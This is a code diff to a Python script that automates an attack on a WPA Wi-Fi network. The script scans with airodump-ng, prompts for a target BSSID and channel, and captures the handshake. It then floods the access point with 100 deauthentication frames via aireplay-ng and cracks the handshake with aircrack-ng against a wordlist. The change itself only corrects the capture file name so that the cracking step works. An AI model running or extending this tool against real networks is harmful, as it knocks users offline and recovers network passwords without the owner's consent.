@@ -17,7 +17,7 @@ def main():
     run_command(["qterminal", "--title", "scan", "-e", "airodump-ng", "wlan0"], wait=False)
     bssid = input("BSSID?: ")
     channel = input("Channel?: ")
-    run_command(["qterminal", "--title", "handshake", "-e", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "MISC/WPA/wificrack.cap", "wlan0", "--ignore-negative-one"], wait=False)
+    run_command(["qterminal", "--title", "handshake", "-e", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "MISC/WPA/wificrack", "wlan0", "--ignore-negative-one"], wait=False)
     run_command(["qterminal", "--title", "aireplay-ng", "-e", "aireplay-ng", "--deauth", "100", "-a", bssid, "wlan0", "--ignore-negative-one"])
     print("Press Ctrl+C if you are ready")
     try:
@@ -26,7 +26,7 @@ def main():
     except KeyboardInterrupt:
         choice = input("Do you want to crack the captured handshake? (y/n): ").strip().lower()
         if choice == "y":
-            run_command(["sudo", "aircrack-ng", "-w", "MISC/WORDLIST/wordlist.txt", "-b", bssid, "MISC/WPA/wificrack.cap"])
+            run_command(["sudo", "aircrack-ng", "-w", "MISC/WORDLIST/wordlist.txt", "-b", bssid, "MISC/WPA/wificrack-01.cap"])
         else:
             print("Exiting without cracking the handshake.")
             exit(0)
